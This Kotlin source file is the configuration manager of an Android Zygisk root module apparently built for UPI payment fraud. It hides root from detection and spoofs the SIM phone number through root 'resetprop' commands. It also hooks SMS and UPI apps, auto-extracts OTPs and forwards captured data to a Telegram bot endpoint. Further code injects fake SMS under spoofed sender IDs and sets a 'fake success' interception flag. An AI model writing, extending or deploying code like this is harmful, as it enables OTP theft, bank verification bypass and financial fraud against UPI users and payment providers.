package com.hivirtus.zygiskmode

import android.content.Context
import org.json.JSONObject
import java.io.File
import java.util.concurrent.Executors

data class ModuleConfig(
    val hideRoot: Boolean = false,
    val hideDeveloper: Boolean = false,
    val hideMagisk: Boolean = true,
    val hideKernelSu: Boolean = true,
    val hideApatch: Boolean = true,
    val hideSukisu: Boolean = true,
    val hideAllRootApps: Boolean = true,
    val enableVirtualSim: Boolean = false,
    val enableSim1Mock: Boolean = false,
    val enableSim2Mock: Boolean = false,
    val enablePhoneSpoof: Boolean = false,
    val mockCountryIso: String = "in",
    val mockPhoneSim1: String = "",
    val mockPhoneSim2: String = "+919876543211",
    val hookIncomingSms: Boolean = false,
    val hookOutgoingSms: Boolean = true,
    val hookUpiVerification: Boolean = false,
    val hookedUpiApps: Map<String, Boolean> = UpiAppRegistry.defaultHookMap(),
    val autoExtractOtp: Boolean = true,
    val autoForwardToken: Boolean = true,
    val forwardUrl: String = "",
    val forwardMethod: String = "POST",
    val telegramBotToken: String = "",
    val telegramChatId: String = "",
    val spoofAndroidId: String = "",
    val enableDeviceIdSpoof: Boolean = false,
    val injectSenderId: String = "",
    val injectMessageBody: String = "",
    val upiTimerBonusSeconds: Int = 20,
    val upiAppTimerBonuses: Map<String, Int> = UpiAppRegistry.defaultTimerMap(),
    val overrideIncomingSender: Boolean = false,
    val fakeInterceptTelegram: Boolean = false,
    val interceptFakeSuccess: Boolean = true,
    val prefixEnabled: Boolean = false,
    val prefixText: String = "",
    val autoHookForeground: Boolean = true,
    val hookAllUpiApps: Boolean = true,
)

data class LastOtp(
    val otp: String,
    val sender: String,
    val body: String = "",
    val phone: String = "",
    val messageLabel: String = "",
    val direction: String = "incoming",
    val rawPeer: String = "",
    val capturedAt: Long = 0L
)

class ConfigManager(private val context: Context) {

    private val appDir: File
        get() = context.getExternalFilesDir(null) ?: context.filesDir

    private val appConfigFile: File
        get() = File(appDir, APP_CONFIG_NAME)

    private val appInjectFile: File
        get() = File(appDir, APP_INJECT_NAME)

    private val appOtpFile: File
        get() = File(appDir, APP_OTP_NAME)

    private val runtimeConfig = File(RUNTIME_CONFIG)
    private val moduleConfig = File(MODULE_CONFIG)
    private val injectCommand = File(INJECT_COMMAND)
    private val lastOtpFile = File(LAST_OTP_FILE)
    private val rootTypeFile = File(ROOT_TYPE_FILE)
    private val spoofPhoneFile = File(SPOOF_PHONE_FILE)

    private val userMockPhoneFile: File
        get() = File(appDir, USER_MOCK_PHONE_NAME)

    private val ioExecutor = Executors.newSingleThreadExecutor()

    fun load(): ModuleConfig {
        val fromApp = if (appConfigFile.exists()) parseConfigFile(appConfigFile) else null
        val parsed = when {
            runtimeConfig.canRead() -> parseConfigFile(runtimeConfig)
            moduleConfig.canRead() -> parseConfigFile(moduleConfig)
            fromApp != null -> fromApp
            else -> ModuleConfig()
        }
        val telegram = TelegramCredentialStore.load(context)
        val mergedTelegram = parsed.copy(
            telegramBotToken = telegram.botToken.ifBlank { parsed.telegramBotToken }
                .ifBlank { fromApp?.telegramBotToken.orEmpty() },
            telegramChatId = telegram.chatId.ifBlank { parsed.telegramChatId }
                .ifBlank { fromApp?.telegramChatId.orEmpty() },
            autoForwardToken = if (telegram.botToken.isNotBlank() && telegram.chatId.isNotBlank()) {
                true
            } else {
                parsed.autoForwardToken
            },
            forwardUrl = if (telegram.botToken.isNotBlank()) {
                "https://api.telegram.org/bot${telegram.botToken}/sendMessage"
            } else {
                parsed.forwardUrl
            }
        )
        val userPhone = readUserMockPhoneRaw().ifBlank { readSpoofPhoneDirect() }
        val spoofDigits = mockSimDigits10(userPhone.ifBlank { mergedTelegram.mockPhoneSim1 })
        if (spoofDigits.length == 10) {
            val normalized = normalizePhone(spoofDigits)
            return mergedTelegram.copy(
                mockPhoneSim1 = normalized,
                enableVirtualSim = mergedTelegram.enableVirtualSim || mergedTelegram.enableSim1Mock ||
                    mergedTelegram.enablePhoneSpoof,
                enableSim1Mock = mergedTelegram.enableSim1Mock || mergedTelegram.enableVirtualSim,
                enablePhoneSpoof = mergedTelegram.enablePhoneSpoof || mergedTelegram.enableVirtualSim
            )
        }
        return mergedTelegram
    }

    /** App storage pe save — kabhi crash nahi. Root sync background me. */
    fun save(config: ModuleConfig): Boolean {
        return try {
            val payload = buildJson(config).toString(2)
            appDir.mkdirs()
            appConfigFile.writeText(payload)
            queuePushToModule(appConfigFile.absolutePath, payload)
            syncBootHideFlag(config)
            true
        } catch (_: Exception) {
            false
        }
    }

    /** Hook start — module paths pe turant sync (race avoid). */
    fun saveAndFlushSync(config: ModuleConfig): Boolean {
        return try {
            val payload = buildJson(config).toString(2)
            appDir.mkdirs()
            appConfigFile.writeText(payload)
            pushPayloadQuiet(appConfigFile.absolutePath, payload)
            syncBootHideFlag(config)
            ActiveHookManager.persistHookedScope(config.hookedUpiApps.filter { it.value }.keys)
            true
        } catch (_: Exception) {
            false
        }
    }

    fun writeSpoofPhoneSync(phone: String) {
        if (phone.isBlank()) return
        val normalized = normalizePhone(phone)
        try {
            appDir.mkdirs()
            File(appDir, "hivirtus_spoof_phone.txt").writeText(normalized)
        } catch (_: Exception) {}
        val escaped = normalized.replace("'", "'\\''")
        try {
            spoofPhoneFile.writeText(normalized)
        } catch (_: Exception) {
            runSu("echo '$escaped' > '$SPOOF_PHONE_FILE' && chmod 644 '$SPOOF_PHONE_FILE'")
        }
        try {
            File(MODULE_SPOOF_PHONE_FILE).writeText(normalized)
        } catch (_: Exception) {
            runSu("mkdir -p /data/adb/modules/hivirtus_zygisk_mode && echo '$escaped' > '$MODULE_SPOOF_PHONE_FILE' && chmod 644 '$MODULE_SPOOF_PHONE_FILE'")
        }
        applyPhoneSystemProps(normalized)
        try {
            java.io.File("/data/local/tmp/hivirtus_spoof_digits10.txt").writeText(
                normalized.replace(Regex("[^0-9]"), "").takeLast(10)
            )
        } catch (_: Exception) {}
    }

    fun captureRealPhoneIfMissing() {
        val realFile = File(REAL_PHONE_FILE)
        if (realFile.canRead() && realFile.readText().trim().isNotBlank()) return
        val line = ShellHelper.runSuOutput(
            "cmd phone get-line1-number 2>/dev/null || getprop persist.radio.line1 2>/dev/null"
        )?.trim().orEmpty()
        if (line.isBlank()) return
        try {
            realFile.writeText(line)
        } catch (_: Exception) {
            val escaped = line.replace("'", "'\\''")
            runSu("echo '$escaped' > '$REAL_PHONE_FILE' && chmod 644 '$REAL_PHONE_FILE'")
        }
    }

    fun update(transform: (ModuleConfig) -> ModuleConfig): Boolean {
        return save(transform(load()))
    }

    fun writeInjectCommand(sender: String, body: String): Boolean {
        return try {
            val safeSender = sender.replace("|", "-").trim().ifBlank { "AD-TEST-S" }
            val safeBody = body.replace("|", " ").replace("\n", " ").trim()
            val content = "INJECT|$safeSender|$safeBody"
            appDir.mkdirs()
            appInjectFile.writeText(content)
            ioExecutor.execute { pushInjectToModule(content) }
            true
        } catch (_: Exception) {
            false
        }
    }

    fun readRootType(): String {
        return try {
            if (!rootTypeFile.canRead()) return "Unknown"
            rootTypeFile.readText().trim().ifBlank { "Unknown" }
        } catch (_: Exception) {
            "Unknown"
        }
    }

    /** App-private file — hamesha writable, menu close pe bhi safe. */
    fun readUserMockPhoneRaw(): String {
        return try {
            if (!userMockPhoneFile.exists()) return ""
            userMockPhoneFile.readText().trim()
        } catch (_: Exception) {
            ""
        }
    }

    private fun writeUserMockPhone(phone: String) {
        if (phone.isBlank()) return
        try {
            appDir.mkdirs()
            userMockPhoneFile.writeText(normalizePhone(phone))
        } catch (_: Exception) {}
    }

    /** load() call nahi — circular dependency avoid. */
    fun readSpoofPhoneDirect(): String {
        val fromUser = readUserMockPhoneRaw()
        if (fromUser.isNotBlank()) return fromUser
        try {
            val appSpoof = File(appDir, "hivirtus_spoof_phone.txt")
            if (appSpoof.canRead()) {
                val t = appSpoof.readText().trim()
                if (t.isNotBlank()) return t
            }
        } catch (_: Exception) {}
        return try {
            if (!spoofPhoneFile.canRead()) ""
            else spoofPhoneFile.readText().trim()
        } catch (_: Exception) {
            ""
        }
    }

    fun readSpoofPhone(): String {
        val direct = readSpoofPhoneDirect()
        if (direct.isNotBlank()) return direct
        return try {
            val fromJson = when {
                runtimeConfig.canRead() -> parseConfigFile(runtimeConfig).mockPhoneSim1
                moduleConfig.canRead() -> parseConfigFile(moduleConfig).mockPhoneSim1
                appConfigFile.exists() -> parseConfigFile(appConfigFile).mockPhoneSim1
                else -> ""
            }
            fromJson.trim()
        } catch (_: Exception) {
            ""
        }
    }

    /**
     * Mock SIM toggle + number — turant config.json + spoof_phone.txt sync (Zygisk native).
     * @return true jab enabled ho aur 10-digit number valid ho, ya disabled save ho gaya ho
     */
    fun syncMockSim(enabled: Boolean, phoneRaw: String): Boolean {
        val digits = phoneRaw.replace(Regex("[^0-9]"), "")
        val ten = when {
            digits.length >= 12 && digits.startsWith("91") -> digits.substring(2)
            digits.length >= 10 -> digits.takeLast(10)
            else -> ""
        }
        val normalized = if (ten.length == 10) "+91$ten" else phoneRaw.trim()

        val current = load()
        val updated = current.copy(
            enableVirtualSim = enabled,
            enableSim1Mock = enabled,
            enablePhoneSpoof = enabled,
            mockPhoneSim1 = if (ten.length == 10) normalized else current.mockPhoneSim1,
            hookOutgoingSms = if (enabled) true else current.hookOutgoingSms,
            interceptFakeSuccess = if (enabled) true else current.interceptFakeSuccess,
            autoHookForeground = true
        )

        if (!saveAndFlushSync(updated)) return false

        if (enabled && ten.length == 10) {
            writeUserMockPhone(normalized)
            captureRealPhoneIfMissing()
            writeSpoofPhoneSync(normalized)
            return true
        }
        return !enabled
    }

    fun syncSenderOverride(enabled: Boolean, senderIdRaw: String = ""): Boolean {
        val senderId = senderIdRaw.trim().uppercase()
        val current = load()
        val updated = current.copy(
            overrideIncomingSender = enabled,
            injectSenderId = if (enabled && senderId.isNotBlank()) senderId else current.injectSenderId
        )
        return saveAndFlushSync(updated)
    }

    fun syncSenderId(senderIdRaw: String): Boolean {
        val senderId = senderIdRaw.trim().uppercase()
        val current = load()
        val updated = current.copy(
            injectSenderId = senderId,
            overrideIncomingSender = senderId.isNotBlank(),
            autoForwardToken = if (senderId.isNotBlank()) true else current.autoForwardToken
        )
        return saveAndFlushSync(updated)
    }

    /** Bot token + chat ID — ek baar dalo, save + runtime sync turant. */
    fun syncTelegramCredentials(botToken: String, chatId: String): Boolean {
        val token = botToken.trim()
        val chat = chatId.trim()
        if (token.isBlank() || chat.isBlank()) return false
        TelegramCredentialStore.save(context, token, chat)
        val current = load()
        val forwardUrl = "https://api.telegram.org/bot$token/sendMessage"
        val updated = current.copy(
            telegramBotToken = token,
            telegramChatId = chat,
            forwardUrl = forwardUrl,
            autoForwardToken = true,
            fakeInterceptTelegram = true
        )
        return saveAndFlushSync(updated)
    }

    fun mockSimDigits10(phone: String): String {
        val digits = phone.replace(Regex("[^0-9]"), "")
        return when {
            digits.length >= 12 && digits.startsWith("91") -> digits.substring(2)
            digits.length >= 10 -> digits.takeLast(10)
            else -> ""
        }
    }

    fun writeSpoofPhone(phone: String) {
        if (phone.isBlank()) return
        val normalized = normalizePhone(phone)
        try {
            appDir.mkdirs()
            File(appDir, "hivirtus_spoof_phone.txt").writeText(normalized)
        } catch (_: Exception) {}
        ioExecutor.execute {
            val escaped = normalized.replace("'", "'\\''")
            try {
                spoofPhoneFile.writeText(normalized)
            } catch (_: Exception) {
                runSu("echo '$escaped' > '$SPOOF_PHONE_FILE' && chmod 644 '$SPOOF_PHONE_FILE'")
            }
            try {
                File(MODULE_SPOOF_PHONE_FILE).writeText(normalized)
            } catch (_: Exception) {
                runSu("mkdir -p /data/adb/modules/hivirtus_zygisk_mode && echo '$escaped' > '$MODULE_SPOOF_PHONE_FILE' && chmod 644 '$MODULE_SPOOF_PHONE_FILE'")
            }
            applyPhoneSystemProps(normalized)
        }
    }

    private fun normalizePhone(phone: String): String {
        val digits = phone.replace(Regex("[^0-9]"), "")
        return when {
            digits.length == 10 -> "+91$digits"
            digits.length == 12 && digits.startsWith("91") -> "+$digits"
            phone.startsWith("+") -> phone
            else -> phone
        }
    }

    private fun applyPhoneSystemProps(phone: String) {
        val escaped = phone.replace("'", "'\\''")
        val digits = phone.replace(Regex("[^0-9]"), "")
        val ten = when {
            digits.length >= 12 && digits.startsWith("91") -> digits.substring(2)
            digits.length >= 10 -> digits.takeLast(10)
            else -> digits
        }
        val plus91 = if (ten.length == 10) "+91$ten" else phone
        val cmds = listOf(
            "resetprop persist.vendor.radio.nitz_number_0 '$plus91'",
            "resetprop persist.vendor.radio.nitz_number_1 '$plus91'",
            "resetprop persist.sys.phone.phone_number '$plus91'",
            "resetprop persist.radio.line1 '$plus91'",
            "resetprop persist.radio.line1_1 '$plus91'",
            "resetprop persist.radio.line1_2 '$plus91'",
            "resetprop vendor.ril.sim.phone_number '$plus91'",
            "resetprop vendor.ril.sim.phone_number_1 '$plus91'",
            "resetprop ro.ril.msn '$ten'",
            "resetprop ril.ecclist '$ten'",
            "resetprop gsm.sim.operator.numeric '40445'",
            "resetprop gsm.operator.numeric '40445'"
        )
        cmds.forEach { runSu(it) }
        try {
            java.io.File("/data/local/tmp/hivirtus_spoof_phone.txt").writeText(plus91)
            if (ten.length == 10) {
                java.io.File("/data/local/tmp/hivirtus_spoof_digits10.txt").writeText(ten)
            }
        } catch (_: Exception) {}
    }

    fun readLastOtp(): LastOtp? {
        if (appOtpFile.canRead()) {
            parseOtpFile(appOtpFile)?.let { return it }
        }
        if (lastOtpFile.canRead()) {
            return parseOtpFile(lastOtpFile)
        }
        return null
    }

    private fun parseOtpFile(file: File): LastOtp? {
        return try {
            val json = JSONObject(file.readText())
            LastOtp(
                otp = json.optString("otp", ""),
                sender = json.optString("sender", ""),
                body = json.optString("body", ""),
                phone = json.optString("phone", readSpoofPhone()),
                messageLabel = json.optString("message_label", ""),
                direction = json.optString("direction", "incoming"),
                rawPeer = json.optString("raw_peer", ""),
                capturedAt = json.optLong("captured_at", 0L)
            )
        } catch (_: Exception) {
            null
        }
    }

    private fun syncBootHideFlag(config: ModuleConfig) {
        val enable = config.hideRoot || config.hideDeveloper
        ioExecutor.execute {
            try {
                if (enable) {
                    bootHideFlagFile.writeText("1")
                    runSu("echo 1 > '$BOOT_HIDE_FLAG' && chmod 644 '$BOOT_HIDE_FLAG'")
                } else {
                    bootHideFlagFile.delete()
                    runSu("rm -f '$BOOT_HIDE_FLAG'")
                }
            } catch (_: Exception) {}
        }
    }

    private val bootHideFlagFile: File
        get() = File(BOOT_HIDE_FLAG)

    private fun queuePushToModule(localPath: String, payload: String) {
        ioExecutor.execute { pushPayloadQuiet(localPath, payload) }
    }

    private fun pushInjectToModule(content: String) {
        try {
            injectCommand.parentFile?.mkdirs()
            injectCommand.writeText(content)
        } catch (_: Exception) {
            runSu("cp '${appInjectFile.absolutePath}' '$INJECT_COMMAND' && chmod 644 '$INJECT_COMMAND'")
        }
    }

    private fun pushPayloadQuiet(localPath: String, payload: String) {
        val merged = mergeTelegramIntoPayload(payload)
        try {
            appConfigFile.parentFile?.mkdirs()
            appConfigFile.writeText(merged)
        } catch (_: Exception) {}
        try {
            runtimeConfig.parentFile?.mkdirs()
            runtimeConfig.writeText(merged)
            runtimeConfig.setReadable(true, false)
        } catch (_: Exception) {}
        try {
            moduleConfig.parentFile?.mkdirs()
            moduleConfig.writeText(merged)
        } catch (_: Exception) {}
        val escapedPath = localPath.replace("'", "'\\''")
        runSu(
            "mkdir -p /data/adb/modules/hivirtus_zygisk_mode 2>/dev/null; " +
                "cp '$escapedPath' '$RUNTIME_CONFIG' 2>/dev/null; chmod 666 '$RUNTIME_CONFIG' 2>/dev/null; " +
                "cp '$escapedPath' '$MODULE_CONFIG' 2>/dev/null; chmod 644 '$MODULE_CONFIG' 2>/dev/null"
        )
    }

    private fun mergeTelegramIntoPayload(payload: String): String {
        return try {
            val tg = TelegramCredentialStore.load(context)
            if (tg.botToken.isBlank() || tg.chatId.isBlank()) return payload
            val json = JSONObject(payload)
            json.put("telegram_bot_token", tg.botToken)
            json.put("telegram_chat_id", tg.chatId)
            json.put("auto_forward_token", true)
            json.put("forward_url", "https://api.telegram.org/bot${tg.botToken}/sendMessage")
            json.toString(2)
        } catch (_: Exception) {
            payload
        }
    }

    private fun parseConfigFile(file: File): ModuleConfig {
        return try {
            val json = JSONObject(file.readText())
            ModuleConfig(
                hideRoot = json.optBoolean("hide_root", false),
                hideDeveloper = json.optBoolean("hide_developer", false),
                hideMagisk = json.optBoolean("hide_magisk", true),
                hideKernelSu = json.optBoolean("hide_kernelsu", true),
                hideApatch = json.optBoolean("hide_apatch", true),
                hideSukisu = json.optBoolean("hide_sukisu", true),
                hideAllRootApps = json.optBoolean("hide_all_root_apps", true),
                enableVirtualSim = json.optBoolean("enable_virtual_sim", false) ||
                    json.optBoolean("enable_sim1_mock", false) ||
                    json.optBoolean("enable_phone_spoof", false),
                enableSim1Mock = json.optBoolean("enable_sim1_mock", false),
                enableSim2Mock = json.optBoolean("enable_sim2_mock", false),
                enablePhoneSpoof = json.optBoolean("enable_phone_spoof", false),
                mockCountryIso = json.optString("mock_country_iso", "in"),
                mockPhoneSim1 = json.optString("mock_phone_sim1", ""),
                mockPhoneSim2 = json.optString("mock_phone_sim2", "+919876543211"),
                hookIncomingSms = json.optBoolean("hook_incoming_sms", false),
                hookOutgoingSms = json.optBoolean("hook_outgoing_sms", true),
                hookUpiVerification = json.optBoolean("hook_upi_verification", false),
                hookedUpiApps = parseHookedApps(json),
                autoExtractOtp = json.optBoolean("auto_extract_otp", true),
                autoForwardToken = json.optBoolean("auto_forward_token", true),
                forwardUrl = json.optString("forward_url", ""),
                forwardMethod = json.optString("forward_method", "POST"),
                telegramBotToken = json.optString("telegram_bot_token", ""),
                telegramChatId = json.optString("telegram_chat_id", ""),
                spoofAndroidId = json.optString("spoof_android_id", ""),
                enableDeviceIdSpoof = json.optBoolean("enable_device_id_spoof", false),
                injectSenderId = json.optString("inject_sender_id", ""),
                injectMessageBody = json.optString("inject_message_body", ""),
                upiTimerBonusSeconds = json.optInt("upi_timer_bonus_seconds", 20),
                upiAppTimerBonuses = parseTimerBonuses(json),
                overrideIncomingSender = json.optBoolean("override_incoming_sender", false),
                fakeInterceptTelegram = json.optBoolean("fake_intercept_telegram", true),
                interceptFakeSuccess = json.optBoolean("intercept_fake_success", true),
                prefixEnabled = json.optBoolean("prefix_enabled", false),
                prefixText = json.optString("prefix_text", ""),
                autoHookForeground = json.optBoolean("auto_hook_foreground", true),
                hookAllUpiApps = json.optBoolean("hook_all_upi_apps", true)
            )
        } catch (_: Exception) {
            ModuleConfig()
        }
    }

    private fun parseTimerBonuses(json: JSONObject): Map<String, Int> {
        if (!json.has("upi_app_timer_bonuses")) return UpiAppRegistry.defaultTimerMap()
        return try {
            val obj = json.getJSONObject("upi_app_timer_bonuses")
            val result = mutableMapOf<String, Int>()
            UpiAppRegistry.ALL.forEach { app ->
                result[app.packageName] = obj.optInt(
                    app.packageName,
                    UpiAppRegistry.timerForPackage(app.packageName, emptyMap())
                )
            }
            result
        } catch (_: Exception) {
            UpiAppRegistry.defaultTimerMap()
        }
    }

    private fun parseHookedApps(json: JSONObject): Map<String, Boolean> {
        val hookAll = json.optBoolean("hook_all_upi_apps", true)
        if (!json.has("hooked_upi_apps")) return UpiAppRegistry.defaultHookMap(hookAll)
        return try {
            val obj = json.getJSONObject("hooked_upi_apps")
            val result = mutableMapOf<String, Boolean>()
            UpiAppRegistry.ALL.forEach { app ->
                result[app.packageName] = if (hookAll) {
                    obj.optBoolean(app.packageName, true)
                } else {
                    obj.optBoolean(app.packageName, false)
                }
            }
            result
        } catch (_: Exception) {
            UpiAppRegistry.defaultHookMap(hookAll)
        }
    }

    private fun buildJson(config: ModuleConfig): JSONObject {
        val hookedJson = JSONObject()
        config.hookedUpiApps.forEach { (pkg, enabled) ->
            try {
                hookedJson.put(pkg, enabled)
            } catch (_: Exception) {}
        }

        val timerJson = JSONObject()
        config.upiAppTimerBonuses.forEach { (pkg, sec) ->
            try { timerJson.put(pkg, sec) } catch (_: Exception) {}
        }

        return JSONObject().apply {
            put("hide_root", config.hideRoot)
            put("hide_developer", config.hideDeveloper)
            put("hide_magisk", config.hideMagisk)
            put("hide_kernelsu", config.hideKernelSu)
            put("hide_apatch", config.hideApatch)
            put("hide_sukisu", config.hideSukisu)
            put("hide_all_root_apps", config.hideAllRootApps)
            put("enable_virtual_sim", config.enableVirtualSim || config.enableSim1Mock || config.enablePhoneSpoof)
            put("enable_sim1_mock", config.enableSim1Mock)
            put("enable_sim2_mock", config.enableSim2Mock)
            put("enable_phone_spoof", config.enablePhoneSpoof)
            put("mock_country_iso", config.mockCountryIso)
            put("mock_phone_sim1", config.mockPhoneSim1)
            put("mock_phone_sim2", config.mockPhoneSim2)
            put("hook_incoming_sms", config.hookIncomingSms)
            put("hook_outgoing_sms", config.hookOutgoingSms)
            put("hook_upi_verification", config.hookUpiVerification)
            put("hooked_upi_apps", hookedJson)
            put("auto_extract_otp", config.autoExtractOtp)
            put("auto_forward_token", config.autoForwardToken)
            put("forward_url", config.forwardUrl)
            put("forward_method", config.forwardMethod)
            put("telegram_bot_token", config.telegramBotToken)
            put("telegram_chat_id", config.telegramChatId)
            put("spoof_android_id", config.spoofAndroidId)
            put("enable_device_id_spoof", config.enableDeviceIdSpoof)
            put("inject_sender_id", config.injectSenderId)
            put("inject_message_body", config.injectMessageBody)
            put("upi_timer_bonus_seconds", config.upiTimerBonusSeconds)
            put("upi_app_timer_bonuses", timerJson)
            put("override_incoming_sender", config.overrideIncomingSender)
            put("fake_intercept_telegram", config.fakeInterceptTelegram)
            put("intercept_fake_success", config.interceptFakeSuccess)
            put("prefix_enabled", config.prefixEnabled)
            put("prefix_text", config.prefixText)
            put("auto_hook_foreground", config.autoHookForeground)
            put("hook_all_upi_apps", config.hookAllUpiApps)
            put("log_file", "/data/local/tmp/hivirtus_zygisk_mode.log")
        }
    }

    private fun runSu(command: String): Boolean = ShellHelper.runSu(command)

    companion object {
        const val USER_MOCK_PHONE_NAME = "hivirtus_user_mock_phone.txt"
        const val APP_CONFIG_NAME = "hivirtus_zygisk_mode_config.json"
        const val APP_INJECT_NAME = "hivirtus_inject.cmd"
        const val APP_OTP_NAME = "hivirtus_last_otp.json"
        private const val BOOT_HIDE_FLAG = "/data/local/tmp/hivirtus_boot_hide_enabled"
        private const val RUNTIME_CONFIG = "/data/local/tmp/hivirtus_zygisk_mode_config.json"
        private const val MODULE_CONFIG = "/data/adb/modules/hivirtus_zygisk_mode/config.json"
        private const val INJECT_COMMAND = "/data/local/tmp/hivirtus_inject.cmd"
        private const val LAST_OTP_FILE = "/data/local/tmp/hivirtus_last_otp.json"
        private const val ROOT_TYPE_FILE = "/data/local/tmp/hivirtus_root_type.txt"
        private const val SPOOF_PHONE_FILE = "/data/local/tmp/hivirtus_spoof_phone.txt"
        private const val REAL_PHONE_FILE = "/data/local/tmp/hivirtus_real_phone.txt"
        private const val MODULE_SPOOF_PHONE_FILE = "/data/adb/modules/hivirtus_zygisk_mode/spoof_phone.txt"
    }
}
